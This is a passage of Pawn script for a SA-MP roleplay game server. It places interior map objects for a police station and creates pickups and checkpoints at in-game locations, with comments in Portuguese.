	CreateDynamicObject(2297,1556.9799800,-1655.5543200,15.2583000,0.0000000,0.0000000,45.0000000); //
	CreateDynamicObject(2253,1557.1752900,-1653.3660900,15.5749600,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2253,1557.3298300,-1656.3641400,15.5749600,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1723,1563.7301000,-1657.8398400,15.2264100,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(1723,1563.7301000,-1657.8398400,15.2264100,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(1723,1561.7026400,-1652.4594700,15.2177900,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2247,1562.9221200,-1654.6558800,16.0062300,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2852,1563.1729700,-1654.5433300,15.5874700,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2277,1562.7695300,-1652.4603300,17.2563800,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2282,1560.2131300,-1652.4287100,17.2115800,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2739,1567.2922400,-1695.9149200,14.9344900,15.3000000,0.1800000,90.0000000); //
	CreateDynamicObject(1523,1569.6059600,-1693.2171600,15.2304700,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2280,1564.1312300,-1671.1250000,16.9272200,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(2286,1566.8671900,-1666.7028800,17.4462400,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(2273,1560.5637200,-1671.1347700,16.9267000,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(1731,1566.6541700,-1665.4856000,17.3737400,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1731,1563.0457800,-1671.4847400,17.3737000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(1731,1561.2590300,-1671.4449500,17.3737000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(1731,1556.7716100,-1666.4702100,17.3737000,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(1731,1556.7789300,-1663.6582000,17.3737000,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(1731,1556.7659900,-1660.5482200,17.3737000,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(2026,1565.1618700,-1695.0637200,18.7039600,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2026,1559.6827400,-1694.8460700,18.7039600,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1491,1557.4431200,-1690.0170900,15.2514300,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2184,1560.4860800,-1697.0511500,15.2520200,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2184,1563.7885700,-1695.9884000,15.2520000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2184,1559.4096700,-1693.8184800,15.2520000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(2184,1562.6855500,-1692.7174100,15.2520000,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(2276,1557.0230700,-1671.9668000,22.2653400,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2270,1558.0323500,-1681.3161600,22.8234600,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(2270,1561.0131800,-1681.3409400,22.8234600,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(2270,1563.6744400,-1681.1368400,22.8234600,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(14455,1566.7022700,-1695.1688200,16.8809800,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2608,1566.6943400,-1697.6223100,17.0726900,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(2008,1557.1461200,-1698.9672900,15.2073800,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2894,1563.7272900,-1695.6506300,16.0603000,0.0000000,0.0000000,70.0000000); //
	CreateDynamicObject(2894,1563.7486600,-1694.3204300,16.0603000,0.0000000,0.0000000,-70.0000000); //
	CreateDynamicObject(2894,1559.4493400,-1695.4172400,16.0603000,0.0000000,0.0000000,-68.9800200); //
	CreateDynamicObject(2894,1559.4836400,-1694.2547600,16.0603000,0.0000000,0.0000000,69.5199700); //
	CreateDynamicObject(2894,1562.2166700,-1692.7990700,16.0603000,0.0000000,0.0000000,160.0000000); //
	CreateDynamicObject(2894,1561.0318600,-1692.7684300,16.0603000,0.0000000,0.0000000,-160.0000000); //
	CreateDynamicObject(2894,1562.1335400,-1696.9827900,16.0603000,0.0000000,0.0000000,-160.0000000); //
	CreateDynamicObject(2894,1560.9950000,-1697.0130600,16.0603000,0.0000000,0.0000000,160.0000000); //
	CreateDynamicObject(1714,1560.5346700,-1698.0395500,15.2316000,0.0000000,0.0000000,160.0000000); //
	CreateDynamicObject(1714,1562.5561500,-1698.1079100,15.2316000,0.0000000,0.0000000,-160.0000000); //
	CreateDynamicObject(1714,1564.8957500,-1696.0976600,15.2316000,0.0000000,0.0000000,-111.4000200); //
	CreateDynamicObject(1714,1564.8790300,-1693.9096700,15.2316000,0.0000000,0.0000000,-69.0999800); //
	CreateDynamicObject(1714,1562.7545200,-1691.7103300,15.2316000,0.0000000,0.0000000,-25.3000400); //
	CreateDynamicObject(1714,1560.5263700,-1691.6101100,15.2316000,0.0000000,0.0000000,-339.8798500); //
	CreateDynamicObject(1714,1558.2865000,-1698.0737300,15.2316000,0.0000000,0.0000000,270.0000000); //
	CreateDynamicObject(1714,1558.3416700,-1693.6872600,15.2509900,0.0000000,0.0000000,-292.3002300); //
	CreateDynamicObject(2894,1559.4836400,-1694.2547600,16.0603000,0.0000000,0.0000000,69.5199700); //
	CreateDynamicObject(1714,1558.2692900,-1695.9797400,15.2509900,0.0000000,0.0000000,-247.4801000); //
	CreateDynamicObject(2828,1557.0139200,-1698.7708700,16.0184200,0.0000000,0.0000000,-98.8200100); //
	CreateDynamicObject(2854,1563.3258100,-1695.1198700,16.0259300,0.0000000,0.0000000,58.9800000); //
	CreateDynamicObject(2853,1561.4676500,-1696.5714100,16.0268400,0.0000000,0.0000000,-160.5600100); //
	CreateDynamicObject(2853,1561.6012000,-1693.2537800,16.0268400,0.0000000,0.0000000,-337.4401900); //
	CreateDynamicObject(2854,1559.7950400,-1694.9831500,16.0259300,0.0000000,0.0000000,-39.3599900); //
	CreateDynamicObject(2007,1572.6868900,-1669.6969000,15.2474300,0.0000000,0.0000000,270.0000000); //
	CreateDynamicObject(2026,1570.7904100,-1668.7133800,18.7039600,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2007,1572.6914100,-1668.7009300,15.2474300,0.0000000,0.0000000,270.0000000); //
	CreateDynamicObject(1523,1568.7437700,-1668.4404300,15.2443900,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(1523,1568.7402300,-1670.8018800,15.2443900,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2026,1562.8179900,-1654.8873300,18.7039600,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1491,1566.9793700,-1665.4180900,15.2126000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(1242,1568.9095500,-1663.4942600,16.6362400,0.0000000,0.0000000,900.0000000); //
	CreateDynamicObject(1242,1569.1898200,-1663.4959700,16.6362400,0.0000000,0.0000000,900.0000000); //
	CreateDynamicObject(1242,1569.4702100,-1663.4776600,16.6362400,0.0000000,0.0000000,900.0000000); //
	CreateDynamicObject(2358,1572.1367200,-1663.4052700,16.5861100,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2035,1571.2362100,-1663.3846400,16.4777600,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2035,1571.3177500,-1663.5238000,16.4777600,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(358,1569.9431200,-1663.3190900,16.7594500,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(358,1570.3433800,-1663.3317900,16.6200900,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1672,1569.9741200,-1663.5252700,16.5683400,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1672,1569.8139600,-1663.5207500,16.5683400,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1672,1570.1339100,-1663.5299100,16.5683400,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1672,1570.2739300,-1663.5339400,16.5683400,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1672,1570.4118700,-1663.5177000,16.5683400,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(630,1569.4689900,-1689.6999500,16.2131100,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(630,1573.0106200,-1689.8138400,16.2131100,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(14493,1560.3714600,-1679.3739000,17.5023200,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2614,1563.8662100,-1689.8753700,17.7050700,0.0000000,0.0000000,900.0000000); //
	CreateDynamicObject(2195,1558.1864000,-1680.2940700,15.6937800,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1827,1559.3933100,-1682.1489300,15.2241500,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(14493,1573.3492400,-1683.4649700,17.5023000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(2195,1572.5548100,-1681.2161900,15.6937800,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1827,1570.8431400,-1682.2934600,15.1545300,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2251,1570.7103300,-1682.3311800,16.4220500,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2251,1559.3249500,-1682.2157000,16.5035000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2273,1560.9960900,-1689.4893800,17.2273600,0.0000000,0.0000000,900.0000000); //
	CreateDynamicObject(2272,1566.4514200,-1689.4752200,17.1896900,0.0000000,0.0000000,900.0000000); //
	CreateDynamicObject(2276,1572.7559800,-1682.2446300,17.2844000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(2280,1570.3858600,-1680.1280500,17.2901200,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2269,1559.0280800,-1680.1236600,17.2585300,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2268,1557.0994900,-1682.1810300,17.2827600,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2833,1557.7198500,-1689.9072300,15.2569000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2611,1556.6430700,-1694.5721400,17.4035800,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2612,1556.6527100,-1696.3326400,17.4166900,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2289,1561.0070800,-1699.5470000,17.6112700,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(2287,1564.0141600,-1699.1192600,17.3080000,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(2286,1558.3028600,-1699.5672600,17.6617500,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(2282,1564.0341800,-1690.6306200,17.1326900,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2026,1562.0556600,-1663.0262500,18.7039600,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1731,1556.7982200,-1687.5537100,17.3110000,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(1731,1556.7729500,-1684.3667000,17.3110000,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(1731,1569.5456500,-1689.7777100,17.3110000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(1731,1572.9304200,-1690.0997300,17.3110000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(14493,1562.7552500,-1655.2149700,22.8247000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(2195,1562.0915500,-1651.8599900,21.1026900,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1827,1559.5849600,-1654.5312500,20.5390500,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(14493,1556.2779500,-1653.6314700,22.8331000,0.0000000,0.0000000,-270.0000000); //
	CreateDynamicObject(2195,1557.3508300,-1651.8171400,21.1026900,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2251,1559.4586200,-1654.5164800,21.8072700,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2852,1559.9715600,-1654.6933600,20.9663000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(956,1565.0560300,-1680.1856700,19.3786300,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(955,1566.2541500,-1680.1796900,19.3747500,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2197,1568.9585000,-1681.2484100,19.0370300,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2197,1568.3066400,-1681.2270500,19.0370300,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2165,1565.9365200,-1691.4423800,19.0235400,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(16662,1575.7034900,-1687.7479200,20.1979200,0.0000000,0.0000000,-115.0000000); //
	CreateDynamicObject(16782,1564.7056900,-1687.4129600,21.1460000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(3396,1571.3042000,-1680.3679200,18.9973900,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(3397,1571.0560300,-1694.6110800,18.9658000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(3395,1567.5543200,-1694.5742200,18.9977600,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(14455,1572.5741000,-1689.7640400,20.5909000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(1721,1567.7132600,-1692.9657000,19.0235000,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(1721,1571.2869900,-1692.9570300,19.0235000,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(1721,1571.1669900,-1682.0195300,19.0235000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2608,1572.5352800,-1691.5119600,21.3501000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(2611,1564.4956100,-1684.4140600,21.0077400,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2612,1564.5006100,-1682.6940900,21.0023900,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(1721,1565.4423800,-1690.2978500,19.0235000,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(2026,1568.9848600,-1687.6943400,22.5303200,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2205,1570.7755100,-1658.9483600,20.5894000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2205,1568.4431200,-1658.2895500,20.5694000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2205,1569.7741700,-1658.2860100,20.5894000,0.0000000,0.0000000,900.0000000); //
	CreateDynamicObject(2205,1566.1197500,-1658.3015100,20.5694000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2205,1567.4730200,-1658.2961400,20.5894000,0.0000000,0.0000000,900.0000000); //
	CreateDynamicObject(14455,1567.6845700,-1651.5758100,22.1899400,0.0000000,0.0000000,900.0000000); //
	CreateDynamicObject(14455,1573.4014900,-1651.5344200,22.1899400,0.0000000,0.0000000,900.0000000); //
	CreateDynamicObject(2172,1563.1566200,-1663.6737100,20.5761100,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2172,1563.1473400,-1661.7622100,20.5761100,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2172,1573.2924800,-1662.6348900,20.5761000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(2172,1573.3046900,-1660.7299800,20.5761000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(2202,1563.1202400,-1659.8429000,20.5000000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2608,1565.1800500,-1663.9364000,22.3664000,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(2191,1567.2694100,-1663.6508800,20.5189700,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(19172,1571.3335000,-1664.0869100,22.3377000,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(1721,1569.7922400,-1656.9586200,20.5610800,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(1721,1568.8337400,-1656.9569100,20.5610800,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(1721,1567.8730500,-1656.9472700,20.5610800,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(1721,1566.9334700,-1656.9329800,20.5610800,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(1721,1565.9534900,-1656.9749800,20.5610800,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(1721,1564.7359600,-1658.2736800,20.5611000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(1721,1565.9400600,-1659.5738500,20.5611000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1721,1566.8837900,-1659.5932600,20.5611000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1721,1567.8182400,-1659.5970500,20.5611000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1721,1568.7177700,-1659.6092500,20.5611000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1721,1569.6580800,-1659.6251200,20.5611000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1714,1572.1313500,-1658.2965100,20.5682900,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(1721,1564.4875500,-1661.1667500,20.5611000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(1721,1564.4245600,-1663.1095000,20.5611000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(1721,1572.0408900,-1661.3405800,20.5611000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(1721,1571.9639900,-1663.2360800,20.5611000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(2894,1570.9067400,-1658.2316900,21.5244000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(1723,1563.1699200,-1655.5653100,20.5641000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(1723,1573.2779500,-1653.3559600,20.5641000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(1808,1562.8514400,-1657.0742200,20.5673500,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2287,1563.1473400,-1654.4871800,22.6248400,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2284,1563.1315900,-1658.6189000,22.5838500,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2266,1573.2805200,-1654.4550800,22.6771000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(2026,1566.5472400,-1658.2473100,23.9118400,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2026,1570.7111800,-1658.3295900,23.9118400,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(14493,1569.9624000,-1679.7065400,22.8247000,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(1723,1573.2879600,-1673.0065900,20.5882000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(1723,1568.7420700,-1678.9857200,20.5882000,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(19173,1573.7902800,-1675.2899200,22.6953400,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19174,1568.5655500,-1679.5151400,22.6301400,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(1731,1556.6746800,-1667.0850800,22.7983000,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(1731,1556.6809100,-1663.9565400,22.7983000,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(1731,1556.6616200,-1660.9117400,22.7983000,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(1731,1556.6722400,-1657.4738800,22.7983000,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(1731,1556.6568600,-1654.5739700,22.7983000,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(1731,1565.1003400,-1679.3538800,22.7983000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(1731,1571.5993700,-1679.3612100,22.7983000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(1731,1573.6413600,-1677.2913800,22.7983000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1731,1573.6474600,-1673.2103300,22.7983000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(3858,1556.5821500,-1659.8497300,15.1841300,0.0000000,0.0000000,-45.0000000); //
	CreateDynamicObject(3858,1556.4344500,-1662.8649900,24.2211200,0.0000000,0.0000000,-45.0000000); //
	CreateDynamicObject(3858,1556.3659700,-1689.6401400,21.2659100,0.0000000,0.0000000,-45.0000000); //
	CreateDynamicObject(3858,1556.3659700,-1689.6401400,15.5374100,0.0000000,0.0000000,-45.0000000); //
	CreateDynamicObject(3857,1564.2878400,-1688.1268300,22.9696200,0.0000000,0.0000000,-45.0000000); //

	elevadordp = CreateObject(18755, 1570.57593, -1655.18555, 17.09180,   0.00000, 0.00000, 90.00000);
	//-- Pickups
	ePick[0] = CreatePickup(1247, 23, 1555.1055, -1675.6426, 16.1953); // Delegacia LS
	ePick[1] = CreatePickup(1276, 23, 1836.5631, -1682.5184, 13.3427); // Alhambra LS
	ePick[2] = CreatePickup(1210, 23, 1310.4525,-1367.4639,13.4724); // Agência de Los Santos
	ePick[3] = CreatePickup(1274, 23, 1778.3708, -1721.8687, 13.4134); // Banco LS
	ePick[4] = CreatePickup(1581, 23, 1657.9943, -1343.3003, 17.4365); // Auto Escola
	ePick[6] = CreatePickup(2710, 23, 1169.9524, -1489.6898, 22.7558); // 24/7 ²
	ePick[7] = CreatePickup(1239, 23, 1631.8516, -1172.9270, 24.0843); // Loterica
	ePick[15] = CreatePickup(1239, 23, 1481.0233,-1771.7765,18.7957); // Prefeitura LS
	//
	ePick[36] = CreatePickup(1239, 23, -2765.3511, 375.5041, 6.3359); // Prefeitura SF
	//
	ePick[37] = CreatePickup(1239, 23, -2026.6133, -100.9539, 35.1641); // Auto Escola SF
	//
	ePick[38] = CreatePickup(1247, 23, -1605.4912, 711.4242, 13.8672); // Delegacia SF
	ePick[39] = CreatePickup(1314, 23, 625.7263, -2244.6213, 13.1349); // Cruzeiro LS
	ePick[40] = CreatePickup(1274, 23, 1767.4434,-1699.8270,13.5096); // Cofre Banco LS
	//
	ePick[16] = CreatePickup(1210, 23, -2227.2854, 251.9700, 35.3203); // Agência San Fierro
	//
	ePick[17] = CreatePickup(1210, 23, 1952.8214, 1342.8403, 15.3672); // Agência Las Ventura
	ePick[18] = CreatePickup(1210, 23, -206.9538,1119.1993,20.4297); // Agência de Fort Carson
	ePick[19] = CreatePickup(1210, 23, 207.8856, -62.8081, 1.5781); // Agência de Blueberry
	ePick[20] = CreatePickup(1210, 23, -2130.4309,-2434.8296,30.6250); // Agência de Angel Pine
	ePick[22] = CreatePickup(1274, 23, 2127.5425,2378.9783,10.8203); // Banco LV
	ePick[23] = CreatePickup(1274, 23, -2425.3201, 337.5206, 37.0020); // Banco SF
	//ePick[23] = CreatePickup(1274, 23, -2765.3723, 375.5843, 6.3359); // Banco SF
    ePick[24] = CreatePickup(1314, 23, 2131.4861, -973.9576, 59.7856); // Duelo
    ePick[25] = CreatePickup(1314, 23, -2242.6570, 128.5913, 35.3203); // RC
    // Civil
    ePick[26] = CreatePickup(1242, 23, -1614.6805, 682.0648, 7.1875, -1); // Colete Civil
    ePick[27] = CreatePickup(1275, 23, -1614.6555, 686.4517, 7.1875, -1); // Farda Civil
	// Militar
	ePick[28] = CreatePickup(1242, 23, 1567.8698,-1670.0620,16.2505, -1); // Colete Militar
	ePick[29] = CreatePickup(1275, 23, 1568.0817,-1667.5648,16.2505, -1); // Farda Militar
	// Federal
	ePick[30] = CreatePickup(1242, 23, 2252.5640, 2491.4509, 10.9908, -1); // Colete Federal
	ePick[31] = CreatePickup(1275, 23, 2250.6257, 2490.3950, 10.9908, -1); // Farda Federal
	// Guarda
	ePick[32] = CreatePickup(1242, 23, -223.6873, 988.3895, 19.6491, -1); // Colete Gurda
	ePick[33] = CreatePickup(1275, 23, -220.7423, 988.4965, 19.6317, -1); // Farda Guarda
	// Delegado
	ePick[34] = CreatePickup(1242, 23, 618.8519,-584.8560,17.2266, -1); // Colete Delegado
	ePick[35] = CreatePickup(1275, 23, 614.4798, -584.9612, 17.2266, -1); // Farda delegado
	ePick[41] = CreatePickup(1239, 23, 328.5529, -1513.7094, 36.0391, -1); // Hotel LS
	ePick[42] = CreatePickup(1240, 23, 2232.8218,-1333.2921,23.9816, -1); // Igreja
	// Saidas
	sPick[0] = CreatePickup(1318, 23, 1560.7961,-1675.6205,16.2505); // Saída Delegacia
	sPick[1] = CreatePickup(1318, 23, 493.4367, -24.9197, 1000.6719); // Saída Alhambra
	sPick[2] = CreatePickup(1318, 23, 246.4077, 107.6076, 1003.2188); // Saída Agencia
	sPick[3] = CreatePickup(1318, 23, 834.6674, 7.4959, 1004.1870); // Saída Banco
	sPick[4] = CreatePickup(1318, 23, -2026.8789, -103.6022, 1035.1833); // Saída Auto Escola
	sPick[6] = CreatePickup(1318, 23, -25.8498, -188.2523, 1003.5469, 24); // Saída 24/7²
	sPick[7] = CreatePickup(1318, 23, -2158.6572, 643.1335, 1052.3750); // Saída Loterica
	sPick[15] = CreatePickup(1318, 23, 390.0609, 173.7708, 1008.3828); // Saída prefeitura
	sPick[16] = CreatePickup(1318, 23, 2304.6934, -16.0919, 26.7422); // Saída Agência San Fierro
	sPick[20] = CreatePickup(1239, 23, 2214.6999511719,-1150.5999755859,1025.8000488281, -1); // Hotel LS
	sPick[21] = CreatePickup(1318, 23, 246.8718, 62.3202, 1003.6406); // Saída Delegacia
	sPick[22] = CreatePickup(1318, 23, 2235.7280,-1334.2772,24.0924); // Saída Igreja
    //-- Checkpoints
	CP_DV1 = CreateDynamicCP(2401.9275,-1506.4696,23.3550, 1.4, -1, -1, -1, 20.0);
	CP_DV2 = CreateDynamicCP(1179.7521,-902.8798,42.8330, 1.4, -1, -1, -1, 20.0);
	CP_DV3 = CreateDynamicCP(800.5552,-1629.6398,12.9030, 1.4, -1, -1, -1, 20.0);
	CP_DV4 = CreateDynamicCP(1857.3107,2081.2676,10.3387, 1.4, -1, -1, -1, 20.0);
	CP_DV5 = CreateDynamicCP(2486.0686,2022.3807,10.3402, 1.4, -1, -1, -1, 20.0);
	CP_DV6 = CreateDynamicCP(-2350.0037,-155.5846,34.8405, 1.4, -1, -1, -1, 20.0);
    CP_0 = CreateDynamicCP(246.6424, 118.2427, 1003.2188, 1.4, -1, -1, -1, 100.0); // Agência
    CP_1 = CreateDynamicCP(1780.0449,-1702.8324,12.5, 1.5, -1, -1, -1, 100.0); // Banco
    CP_2 = CreateDynamicCP(-2033.4333, -117.4128, 1035.1719, 1.1, -1, -1, -1, 100.0); // Auto Escola
    CP_3 = CreateDynamicCP(-28.1784, -185.1464, 1003.5469, 1.1, -1, -1, -1, 100.0); // 24/7 ¹ e ²
    CP_4 = CreateDynamicCP(-2159.0813, 640.3607, 1052.3817, 1.0, -1, -1, -1, 100.0); // Loterica
    //CP_5 = CreateDynamicCP(203.7959, -43.5501, 1001.8047, 1.3, -1, -1, -1, 100.0); // Binco
    CP_5 = CreateDynamicCP(207.2894, -100.9030, 1005.2578, 1.3, -1, -1, -1, 100.0); // Binco
    CP_41 = CreateDynamicCP(161.4124, -84.3725, 1001.8047, 1.3, -1, -1, -1, 100.0); // ZIP
    CP_42 = CreateDynamicCP(210.2872, -8.2153, 1005.2109, 1.3, -1, -1, -1, 100.0); // VICTIM
    CP_43 = CreateDynamicCP(206.9874, -129.6057, 1003.5078, 1.3, -1, -1, -1, 100.0); // TRAINHARD
    CP_44 = CreateDynamicCP(204.2473, -159.9653, 1000.5234, 1.3, -1, -1, -1, 100.0); // DS
    CP_45 = CreateDynamicCP(203.7959, -43.5501, 1001.8047, 1.3, -1, -1, -1, 100.0); // SUBURBAN
    CP_46 = CreateDynamicCP(-318.2591, 1048.8253, 20.3403, 1.1, -1, -1, -1, 100.0); // HOSPITAL FORT CARSON
    CP_47 = CreateDynamicCP(-2209.0784, -2287.7100, 30.6250, 1.1, -1, -1, -1, 100.0); // HOSPITAL ANGEL PINE
    CP_48 = CreateDynamicCP(-2655.0383, 638.5671, 14.4531, 1.1, -1, -1, -1, 100.0); // HOSPITAL SF
    CP_49 = CreateDynamicCP(1615.1281, 1817.3341, 10.8203, 1.1, -1, -1, -1, 100.0); // HOSPITAL LV
    CP_50 = CreateDynamicCP(-1514.8173, 2519.9592, 55.9913, 1.1, -1, -1, -1, 100.0); // HOSPITAL BLUEBERRY
    CP_51 = CreateDynamicCP(413.8657, 2536.1895, 19.1484, 1.5, -1, -1, -1, 100.0); // BOMBAS
    CP_52 = CreateDynamicCP(1551.3929,-1618.7386,13.5469, 1.5, -1, -1, -1, 100.0); // Guarita
    CP_53 = CreateDynamicCP(1575.0547,-1661.9144,1.0466, 1.5, -1, -1, -1, 100.0); // Refeição
	CP_54 = CreateDynamicCP(1578.8885,-1663.0897,1.0466, 1.5, -1, -1, -1, 100.0); // Pátio
    CP_55 =	CreateDynamicCP(1551.5126,-1616.4089,13.3828, 1.5, -1, -1, -1, 100.0); // Prisão
    CP_56 =	CreateDynamicCP(1786.6965,-1716.2260,12.5096, 1.5, -1, -1, -1, 100.0); // Bebedouro
    CP_57 =	CreateDynamicCP(1791.8444,-1698.6187,12.5096, 1.5, -1, -1, -1, 100.0); // Bebedouro
    CP_58 =	CreateDynamicCP(1547.9932,-1616.7368,12.3828, 1.5, -1, -1, -1, 100.0); // Bebedouro
